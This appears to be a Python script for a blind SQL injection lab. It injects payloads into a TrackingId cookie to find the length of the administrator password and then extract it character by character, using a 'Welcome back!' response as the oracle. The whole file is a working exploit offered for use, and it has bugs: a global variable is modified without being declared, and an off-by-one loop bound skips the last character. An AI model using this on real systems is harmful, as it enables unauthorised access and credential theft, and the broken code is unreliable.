import requests

characters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

cookiess = {'TrackingId': '', 'session': ''}#change as per require ment
temp = ''
def get_length():
    for i in range(1,50): #as passwords cannot be much longer
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = '{i}' --"
        cookiess['TrackingId'] = "" + payload
        r = requests.get(url="", cookies=cookiess)
        if 'Welcome back!' in r.text: #condition to be met to get to know abt blind sqli
                return i
                

def get_pass(length):
    for i in range(1,length):
        for j in characters:
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{j}' --"
            cookiess['TrackingId'] = "" + payload #same data in tracking id must be in  ""
            r = requests.get(url="", cookies=cookiess)
            if 'Welcome back!' in r.text:
                temp += j
                print(temp)
                break
